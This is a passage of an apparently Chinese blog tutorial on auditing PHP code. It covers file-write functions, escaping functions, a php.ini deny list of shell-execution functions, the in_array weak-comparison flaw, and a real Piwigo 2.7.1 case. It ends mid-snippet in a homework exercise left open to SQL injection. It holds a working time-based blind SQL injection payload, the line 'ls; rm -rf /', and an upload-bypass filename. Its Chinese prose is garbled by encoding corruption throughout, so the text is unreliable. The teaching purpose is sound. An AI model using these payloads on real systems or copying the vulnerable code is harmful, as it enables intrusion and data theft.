çµæ´»ï¼Œç”¨äºåˆ›å»ºå„ç§ç±»å‹çš„ç½‘ç»œè¿æ¥ï¼ˆå¦‚TCPã€UDPï¼‰ã€‚</li><li>**<code>get_headers</code>**ï¼šå¯ä»¥è·å–æŒ‡å®šURLçš„HTTPå“åº”å¤´ã€‚</li><li>**<code>file_put_contents</code>**ï¼šå¯ä»¥å†™å…¥æ–‡ä»¶ï¼ŒåŠŸèƒ½ç±»ä¼¼äº<code>fopen</code>+<code>fwrite</code>ï¼Œä½†æ›´ç®€ä¾¿ã€‚</li><li>**<code>copy</code>**ï¼šå¯ä»¥ç›´æ¥å°†æ–‡ä»¶ä»ä¸€ä¸ªè·¯å¾„å¤åˆ¶åˆ°å¦ä¸€ä¸ªè·¯å¾„ã€‚</li><li>**<code>move_uploaded_file</code>**ï¼šå¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶ä½¿ç”¨ï¼Œç”¨äºå°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ã€‚</li><li>**<code>parse_url</code>**ï¼šç”¨äºè§£æURLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†ï¼Œä¾‹å¦‚åè®®ã€ä¸»æœºåã€è·¯å¾„ç­‰ã€‚</li><li>**<code>stream_context_create</code>**ï¼šç”¨äºä¸ºæ–‡ä»¶è¯»å–&#x2F;å†™å…¥åˆ›å»ºå’Œè®¾ç½®æµä¸Šä¸‹æ–‡ï¼Œæ¯”å¦‚å¯ä»¥è®¾ç½®HTTPè¯·æ±‚å¤´ã€‚</li></ul><h2 id="æ–‡ä»¶ä¸Šä¼ -å†™å…¥"><a href="#æ–‡ä»¶ä¸Šä¼ -å†™å…¥" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ &#x2F;å†™å…¥"></a>æ–‡ä»¶ä¸Šä¼ &#x2F;å†™å…¥</h2><table><thead><tr><th>å‡½æ•°&#x2F;æ–¹æ³•</th><th>æè¿°</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td><code>file_put_contents</code></td><td>å°†ä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</td><td><code>file_put_contents(&quot;1.txt&quot;, &quot;6666&quot;);</code></td></tr><tr><td><code>move_uploaded_file</code></td><td>å°†ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æ–°çš„ä½ç½®</td><td><code>move_uploaded_file($_FILES[&quot;pictures&quot;][&quot;tmp_name&quot;], &quot;1.php&quot;);</code></td></tr><tr><td><code>rename</code></td><td>é‡å‘½åæ–‡ä»¶&#x2F;ç›®å½•</td><td><code>rename($oldname, $newname);</code></td></tr><tr><td><code>rmdir</code></td><td>åˆ é™¤ç›®å½•</td><td><code>rmdir(&quot;directory_name&quot;);</code></td></tr><tr><td><code>mkdir</code></td><td>åˆ›å»ºç›®å½•</td><td><code>mkdir(&quot;new_directory&quot;);</code></td></tr><tr><td><code>unlink</code></td><td>åˆ é™¤æ–‡ä»¶</td><td><code>unlink(&quot;file.txt&quot;);</code></td></tr><tr><td><code>copy</code></td><td>å¤åˆ¶æ–‡ä»¶</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><code>fopen</code>, <code>fputs</code>, <code>fwrite</code></td><td>æ‰“å¼€æ–‡ä»¶æˆ–URL</td><td><a href="https://www.php.net/manual/zh/function.fwrite.php">fwriteå®˜æ–¹æ–‡æ¡£</a></td></tr><tr><td><code>link</code></td><td>åˆ›å»ºæ–‡ä»¶ç¡¬é“¾æ¥</td><td><code>link($target, $link);</code></td></tr><tr><td><code>symlink</code></td><td>åˆ›å»ºç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰</td><td><code>symlink($target, $link);</code></td></tr><tr><td><code>tmpfile</code></td><td>åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆåœ¨ä¸´æ—¶ç›®å½•å­˜æ”¾ï¼Œéšæœºæ–‡ä»¶åï¼Œè¿”å›å¥æŸ„ï¼‰</td><td><code>$temp = tmpfile(); fwrite($temp, &quot;123456&quot;); fclose($temp);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;move()</code></td><td>ThinkPHPæ–‡ä»¶ä¸Šä¼ </td><td><code>$file = request()-&gt;file($name); $file-&gt;move($filepath);</code></td></tr><tr><td><code>request()-&gt;file()-&gt;file()</code></td><td>ThinkPHPæ–‡ä»¶ä¸Šä¼ </td><td><code>$file = request()-&gt;file(&#39;upload&#39;);</code></td></tr><tr><td><code>extractTo</code></td><td>è§£å‹ZIPåˆ°ç›®å½•</td><td><code>$zip-&gt;extractTo(&#39;path/to/extract&#39;);</code></td></tr><tr><td><code>DOMDocument loadXML simplexml_import_dom</code></td><td>åŠ è½½è§£æXMLï¼Œå¯èƒ½å­˜åœ¨XXEæ¼æ´ï¼Œé€šè¿‡<code>file_get_contents</code>è·å–å®¢æˆ·ç«¯è¾“å…¥å¹¶åŠ è½½XMLå†…å®¹</td><td><code>&lt;?php $xmlfile = file_get_contents(&#39;php://input&#39;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile); ?&gt;</code></td></tr><tr><td><code>simplexml_load_string</code></td><td>åŠ è½½è§£æXMLå­—ç¬¦ä¸²ï¼Œå¯èƒ½å­˜åœ¨XXEæ¼æ´</td><td><code>$xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]); print_r($xml);</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>è¯»å–æ–‡ä»¶å¹¶ä½œä¸ºXMLæ–‡æ¡£è§£æï¼Œå¯èƒ½å­˜åœ¨XXEæ¼æ´</td><td><code>simplexml_load_file(&#39;file.xml&#39;);</code></td></tr><tr><td><code>unserialize</code></td><td>ååºåˆ—åŒ–å¯¹è±¡</td><td><code>$data = unserialize($_POST[&#39;data&#39;]);</code></td></tr><tr><td><strong><code>fgetcsv</code></strong></td><td>è¯»å–å¹¶è§£æCSVæ ¼å¼çš„è¡Œ</td><td><code>$handle = fopen(&quot;data.csv&quot;, &quot;r&quot;); while (($data = fgetcsv($handle)) !== FALSE) &#123; print_r($data); &#125; fclose($handle);</code></td></tr><tr><td><strong><code>file_exists</code></strong></td><td>æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</td><td><code>if (file_exists(&quot;file.txt&quot;)) &#123; echo &quot;File exists&quot;; &#125;</code></td></tr><tr><td><strong><code>is_readable</code></strong></td><td>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯è¯»</td><td><code>if (is_readable(&quot;file.txt&quot;)) &#123; echo &quot;File is readable&quot;; &#125;</code></td></tr><tr><td><strong><code>is_writable</code></strong></td><td>åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å¯å†™</td><td><code>if (is_writable(&quot;file.txt&quot;)) &#123; echo &quot;File is writable&quot;; &#125;</code></td></tr><tr><td><strong><code>flock</code></strong></td><td>é”å®šæ–‡ä»¶é˜²æ­¢å¹¶å‘è¯»å†™</td><td><code>$fp = fopen(&quot;file.txt&quot;, &quot;r+&quot;); if (flock($fp, LOCK_EX)) &#123; fwrite($fp, &quot;Lock test&quot;); flock($fp, LOCK_UN); &#125; fclose($fp);</code></td></tr><tr><td><strong><code>readlink</code></strong></td><td>è¿”å›ç¬¦å·é“¾æ¥æŒ‡å‘çš„ç›®æ ‡</td><td><code>echo readlink(&quot;/path/to/symlink&quot;);</code></td></tr><tr><td><strong><code>realpath</code></strong></td><td>è¿”å›æ–‡ä»¶æˆ–ç›®å½•çš„ç»å¯¹è·¯å¾„</td><td><code>echo realpath(&quot;test.txt&quot;);</code></td></tr><tr><td><strong><code>chmod</code></strong></td><td>æ”¹å˜æ–‡ä»¶æˆ–ç›®å½•çš„æƒé™</td><td><code>chmod(&quot;file.txt&quot;, 0755);</code></td></tr><tr><td><strong><code>chown</code></strong></td><td>æ”¹å˜æ–‡ä»¶çš„æ‰€æœ‰è€…</td><td><code>chown(&quot;file.txt&quot;, &quot;username&quot;);</code></td></tr></tbody></table><h2 id="PHPåŸç”Ÿè¿‡æ»¤æ–¹æ³•"><a href="#PHPåŸç”Ÿè¿‡æ»¤æ–¹æ³•" class="headerlink" title="PHPåŸç”Ÿè¿‡æ»¤æ–¹æ³•"></a>PHPåŸç”Ÿè¿‡æ»¤æ–¹æ³•</h2><h3 id="1-å‘½ä»¤æ³¨å…¥é˜²æŠ¤"><a href="#1-å‘½ä»¤æ³¨å…¥é˜²æŠ¤" class="headerlink" title="1. å‘½ä»¤æ³¨å…¥é˜²æŠ¤"></a>1. <strong>å‘½ä»¤æ³¨å…¥é˜²æŠ¤</strong></h3><ul><li><strong><code>escapeshellarg</code></strong><ul><li><strong>æè¿°</strong>ï¼šå°†ä¼ å…¥çš„å‚æ•°æ·»åŠ å•å¼•å·å¹¶è½¬ä¹‰åŸæœ‰çš„å•å¼•å·ï¼Œä¸»è¦ç”¨äºé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚å¤„ç†åçš„å­—ç¬¦ä¸²å¯å®‰å…¨åœ°ä½œä¸ºå‘½ä»¤å‚æ•°ã€‚</li><li><strong>ä¾‹å­</strong>ï¼šä¼ å…¥<code>id</code>åå¤„ç†ä¸º<code>&#39;id&#39;</code>ã€‚å¦‚æœä¼ å…¥<code>&#39;id #</code>ï¼Œå¤„ç†åä¸º<code>&#39;\&#39;id #&#39;</code>ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚</li><li><strong>ç”¨æ³•</strong>ï¼š<code>escapeshellarg($arg);</code></li></ul></li><li><strong><code>escapeshellcmd</code></strong><ul><li><strong>æè¿°</strong>ï¼šè½¬ä¹‰å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼Œç”¨äºé˜²æ­¢å‘½ä»¤æ³¨å…¥ã€‚åæ–œçº¿ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$, \x0A å’Œ \xFFã€‚â€™ å’Œ â€œ ä»…åœ¨ä¸é…å¯¹æ—¶è¢«è½¬ä¹‰ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>escapeshellcmd(&#39;ls; rm -rf /&#39;)</code>å°†è½¬ä¹‰å‘½ä»¤ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œé¿å…å‘½ä»¤æ³¨å…¥ã€‚</li><li><strong>ç”¨æ³•</strong>ï¼š<code>escapeshellcmd($cmd);</code></li></ul></li></ul><h3 id="2-SQLæ³¨å…¥é˜²æŠ¤"><a href="#2-SQLæ³¨å…¥é˜²æŠ¤" class="headerlink" title="2. SQLæ³¨å…¥é˜²æŠ¤"></a>2. <strong>SQLæ³¨å…¥é˜²æŠ¤</strong></h3><ul><li><strong><code>addslashes</code></strong><ul><li><strong>æè¿°</strong>ï¼šåœ¨å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NUL å‰åŠ ä¸Šåæ–œçº¿ï¼Œç”¨äºé˜²æ­¢SQLæ³¨å…¥ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>addslashes(&quot;O&#39;Reilly&quot;)</code>è¿”å›<code>O\&#39;Reilly</code>ï¼Œå¯ä»¥å‡å°‘SQLæ³¨å…¥é£é™©ã€‚</li><li><strong>ç”¨æ³•</strong>ï¼š<code>addslashes($input);</code></li></ul></li><li><strong><code>mysqli::real_escape_string</code> &#x2F; <code>mysqli_real_escape_string</code></strong><ul><li><strong>æè¿°</strong>ï¼šè¿™äº›å‡½æ•°åœ¨ NULL (<code>\x00</code>), æ¢è¡Œç¬¦ (<code>\n</code>), å›è½¦ç¬¦ (<code>\r</code>), ç©ºæ ¼å­—ç¬¦ (<code>\x1a</code>), å•å¼•å· (<code>&#39;</code>), åŒå¼•å· (<code>&quot;</code>) å’Œåæ–œçº¿ (<code>\</code>) å‰åŠ ä¸Šåæ–œçº¿ï¼Œå¹¶è€ƒè™‘åˆ°å½“å‰æ•°æ®åº“è¿æ¥çš„å­—ç¬¦é›†ã€‚ç”¨äºé˜²æ­¢SQLæ³¨å…¥ã€‚</li><li><strong>æ³¨æ„</strong>ï¼šå¤„ç†åçš„å­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å¼•å·åŒ…è£¹åæ‹¼æ¥åˆ°SQLè¯­å¥ä¸­ï¼Œå¦åˆ™ä»å¯å¯¼è‡´SQLæ³¨å…¥ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>$conn-&gt;real_escape_string($input);</code></li></ul></li><li><strong><code>PDO::quote</code></strong><ul><li><strong>æè¿°</strong>ï¼šå°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¹¶ä¸ºå­—ç¬¦ä¸²æ·»åŠ å¼•å·ã€‚é€‚ç”¨äºé˜²æ­¢SQLæ³¨å…¥ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>$pdo-&gt;quote(&quot;O&#39;Reilly&quot;);</code> è¿”å› <code>&#39;O\&#39;Reilly&#39;</code></li><li><strong>ç”¨æ³•</strong>ï¼š<code>$pdo-&gt;quote($input);</code></li></ul></li><li><strong><code>PDO::prepare</code></strong><ul><li><strong>æè¿°</strong>ï¼šé¢„å¤„ç†SQLè¯­å¥ï¼Œç¡®ä¿å‚æ•°ä¼ é€’æ—¶ä¸ä¼šç ´åSQLè¯­å¥çš„ç»“æ„ï¼Œæ˜¯é˜²æ­¢SQLæ³¨å…¥çš„æœ€ä½³å®è·µã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM users WHERE id = :id&#39;);</code></li><li><strong>ç”¨æ³•</strong>ï¼š<code>$stmt-&gt;execute([&#39;:id&#39; =&gt; $id]);</code></li></ul></li></ul><h3 id="3-XSSé˜²æŠ¤"><a href="#3-XSSé˜²æŠ¤" class="headerlink" title="3. XSSé˜²æŠ¤"></a>3. <strong>XSSé˜²æŠ¤</strong></h3><ul><li><strong><code>htmlspecialchars</code></strong><ul><li><strong>æè¿°</strong>ï¼šå°†ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&#39;</code>, <code>&quot;</code>ï¼‰è½¬ä¹‰ä¸ºHTMLå®ä½“ï¼Œé˜²æ­¢æ¶æ„è„šæœ¬é€šè¿‡HTMLæ³¨å…¥XSSæ”»å‡»ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>htmlspecialchars(&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;)</code> å°†è¾“å‡º <code>&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;/script&amp;gt;</code></li><li><strong>ç”¨æ³•</strong>ï¼š<code>htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li><li><strong><code>htmlentities</code></strong><ul><li><strong>æè¿°</strong>ï¼šå°†æ‰€æœ‰çš„é€‚åˆçš„å­—ç¬¦è½¬ä¹‰ä¸ºHTMLå®ä½“ï¼Œä¸<code>htmlspecialchars</code>ç±»ä¼¼ï¼Œä½†æ›´åŠ ä¸¥æ ¼ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<code>htmlentities(&#39;&lt;b&gt;bold&lt;/b&gt;&#39;)</code> è¿”å› <code>&amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</code></li><li><strong>ç”¨æ³•</strong>ï¼š<code>htmlentities($input, ENT_QUOTES, &#39;UTF-8&#39;);</code></li></ul></li></ul><h3 id="4-æ•°å­—ç±»å‹è¿‡æ»¤"><a href="#4-æ•°å­—ç±»å‹è¿‡æ»¤" class="headerlink" title="4. æ•°å­—ç±»å‹è¿‡æ»¤"></a>4. <strong>æ•°å­—ç±»å‹è¿‡æ»¤</strong></h3><ul><li><strong><code>intval</code> &#x2F; <code>floatval</code> &#x2F; <code>(int)</code> &#x2F; <code>num+0</code></strong><ul><li><strong>æè¿°</strong>ï¼šå°†è¾“å…¥å¼ºåˆ¶è½¬æ¢ä¸ºæ•´æ•°æˆ–æµ®ç‚¹æ•°ã€‚é€šå¸¸ç”¨äºç¡®ä¿è¾“å…¥ä¸ºæ•°å­—ï¼Œé˜²æ­¢SQLæ³¨å…¥æˆ–é€»è¾‘æ¼æ´ã€‚</li><li><strong>ä¾‹å­</strong>ï¼š<ul><li><code>intval(&#39;42abc&#39;)</code> è¿”å› <code>42</code></li><li><code>floatval(&#39;42.42abc&#39;)</code> è¿”å› <code>42.42</code></li><li><code>(int) &#39;123abc&#39;</code> è¿”å› <code>123</code></li></ul></li><li><strong>ç”¨æ³•</strong>ï¼š<code>intval($input);</code> æˆ– <code>(int)$input;</code></li></ul></li></ul><h3 id="5-å…¶ä»–é˜²æŠ¤é…ç½®é¡¹"><a href="#5-å…¶ä»–é˜²æŠ¤é…ç½®é¡¹" class="headerlink" title="5. å…¶ä»–é˜²æŠ¤é…ç½®é¡¹"></a>5. <strong>å…¶ä»–é˜²æŠ¤é…ç½®é¡¹</strong></h3><ul><li><strong>é…ç½®é˜²æ­¢å‘½ä»¤æ³¨å…¥</strong>ï¼š<ul><li><strong>ç¦ç”¨å±é™©å‡½æ•°</strong>ï¼šé€šè¿‡PHPçš„é…ç½®æ–‡ä»¶<code>php.ini</code>ï¼Œå¯ä»¥ç¦ç”¨å±é™©å‡½æ•°å¦‚<code>system()</code>ã€<code>exec()</code>ã€<code>shell_exec()</code>ç­‰ã€‚</li><li><strong>é…ç½®</strong>ï¼š<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = <span class="string">&quot;exec, passthru, shell_exec, system, proc_open, popen, curl_exec&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>é™åˆ¶æ–‡ä»¶æ“ä½œ</strong>ï¼šå¯ä»¥é€šè¿‡<code>open_basedir</code>é™åˆ¶PHPå¯¹ç‰¹å®šç›®å½•çš„è®¿é—®ï¼Œé˜²æ­¢é€šè¿‡è·¯å¾„æ³¨å…¥æˆ–æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ‰§è¡Œæ¶æ„æ–‡ä»¶ã€‚</li><li><strong>é…ç½®</strong>ï¼š<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span> = <span class="string">&quot;/var/www/html:/tmp&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="in-array-ç¼ºé™·"><a href="#in-array-ç¼ºé™·" class="headerlink" title="in_array() ç¼ºé™·"></a>in_array() ç¼ºé™·</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image.png"><br>åˆ†æä¸Šé¢çš„ä»£ç æµç¨‹ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¥å£ï¼Œä½†æ˜¯å¯¹æ–‡ä»¶åæœ‰ç™½åå•ï¼Œåˆ©ç”¨äº†<code>in_array()</code>æ–¹æ³•ï¼Œè¿™ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">in_array ï¼š(PHP 4, PHP 5, PHP 7)</span><br><span class="line">åŠŸèƒ½ ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</span><br><span class="line">å®šä¹‰ ï¼š bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class="line">åœ¨ $haystack ä¸­æœç´¢ $needle ï¼Œå¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° $strict çš„å€¼ä¸º TRUE ï¼Œåˆ™ in_array() å‡½æ•°ä¼šè¿›è¡Œå¼ºæ£€æŸ¥ï¼Œæ£€æŸ¥ $needle çš„ç±»å‹æ˜¯å¦å’Œ $haystack ä¸­çš„ç›¸åŒã€‚å¦‚æœæ‰¾åˆ° $haystack ï¼Œåˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚</span><br></pre></td></tr></table></figure><p>ç”±äºè¯¥å‡½æ•°å¹¶æœªå°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œè¿™å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ çš„æ–‡ä»¶åæ¥ç»•è¿‡æœåŠ¡ç«¯çš„æ£€æµ‹ï¼Œä¾‹å¦‚æ–‡ä»¶åä¸º 7shell.php ã€‚å› ä¸ºPHPåœ¨ä½¿ç”¨ in_array() å‡½æ•°åˆ¤æ–­æ—¶ï¼Œä¼šå°† 7shell.php å¼ºåˆ¶è½¬æ¢æˆæ•°å­—7ï¼Œè€Œæ•°å­—7åœ¨ range(1,24) æ•°ç»„ä¸­ï¼Œæœ€ç»ˆç»•è¿‡ in_array() å‡½æ•°åˆ¤æ–­ï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ï¼ˆè¿™é‡Œä¹‹æ‰€ä»¥ä¼šå‘ç”Ÿå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæ˜¯å› ä¸ºç›®æ ‡æ•°ç»„ä¸­çš„å…ƒç´ ä¸ºæ•°å­—ç±»å‹ï¼‰æˆ‘ä»¬æ¥çœ‹çœ‹PHPæ‰‹å†Œå¯¹ in_array() å‡½æ•°çš„å®šä¹‰ã€‚</p><h3 id="æ¡ˆä¾‹åˆ†æ"><a href="#æ¡ˆä¾‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h3><p>ä¸‹é¢çœ‹ä¸€ä¸ªå…·ä½“çš„çœŸå®æ¡ˆä¾‹ï¼špiwigo2.7.1 ç‰ˆæœ¬ã€‚è¯¥ç‰ˆæœ¬ç”±äºSQLè¯­å¥ç›´æ¥æ‹¼æ¥ $rate å˜é‡ï¼Œè€Œ $rate å˜é‡ä¹Ÿä»…æ˜¯ç”¨ in_array() å‡½æ•°ç®€å•å¤„ç†ï¼Œå¹¶æœªä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°è¿›è¡Œä¸¥æ ¼åŒ¹é…ï¼Œæœ€ç»ˆå¯¼è‡´sqlæ³¨å…¥æ¼æ´å‘ç”Ÿã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“çš„æ¼æ´ä½ç½®ã€‚æ¼æ´çš„å…¥å£æ–‡ä»¶åœ¨<code>picture.php</code>æ–‡ä»¶ä¸­ï¼Œ<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-1.png"><br>å½“ <code>$_GET[&#39;action&#39;]</code> ä¸º rate çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨æ–‡ä»¶ include&#x2F;functions_rate.inc.php ä¸­çš„ rate_picture æ–¹æ³•ï¼Œè€Œæ¼æ´ä¾¿å­˜åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹å›¾ç¬¬23è¡Œå¤„ç›´æ¥æ‹¼æ¥ $rate å˜é‡ï¼Œè€Œåœ¨ç¬¬2è¡Œä½¿ç”¨ in_array() å‡½æ•°å¯¹ $rate å˜é‡è¿›è¡Œæ£€æµ‹ï¼Œåˆ¤æ–­ $rate æ˜¯å¦åœ¨ <code>$conf[&#39;rate_items&#39;]</code> ä¸­ï¼Œ <code>$conf[&#39;rate_items&#39;]</code> çš„å†…å®¹å¯ä»¥åœ¨ include\config_default.inc.php ä¸­æ‰¾åˆ°ï¼Œä¸º <code>$conf[&#39;rate_items&#39;] = array(0,1,2,3,4,5)</code>;<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-2.png"><br>ç”±äºè¿™é‡Œï¼ˆä¸Šå›¾ç¬¬6è¡Œï¼‰å¹¶æ²¡æœ‰å°† in_array() å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œæ‰€ä»¥ä¼šè¿›è¡Œå¼±æ¯”è¾ƒï¼Œå¯ä»¥ç»•è¿‡ã€‚æ¯”å¦‚æˆ‘ä»¬å°† $rate çš„å€¼è®¾ç½®æˆ <code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code> é‚£ä¹ˆSQLè¯­å¥å°±å˜æˆï¼š<br><code>INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,&#39;192.168.2&#39;,1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) ;</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-3.png" alt="æµç¨‹å¯ä»¥ç®€åŒ–ä¸ºæ­¤å›¾"><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ¼æ´çš„åŸå› æ˜¯å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¼ºåŒ¹é…è¿›è¡Œä¿®å¤ã€‚ä¾‹å¦‚å°† in_array() å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œæˆ–è€…ä½¿ç”¨ intval() å‡½æ•°å°†å˜é‡å¼ºè½¬æˆæ•°å­—ï¼Œåˆæˆ–è€…ä½¿ç”¨æ­£åˆ™åŒ¹é…æ¥å¤„ç†å˜é‡ã€‚è¿™é‡Œæˆ‘å°† in_array() å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ï¼Œä»£ç åŠé˜²æŠ¤æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-4.png"></p><h3 id="ä½œä¸šé¢˜ç›®"><a href="#ä½œä¸šé¢˜ç›®" class="headerlink" title="ä½œä¸šé¢˜ç›®"></a>ä½œä¸šé¢˜ç›®</h3><p>å®¡è®¡ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="variable">$row</span>[<span class="string">&#x27;COUNT(*)&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">stop_hack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span 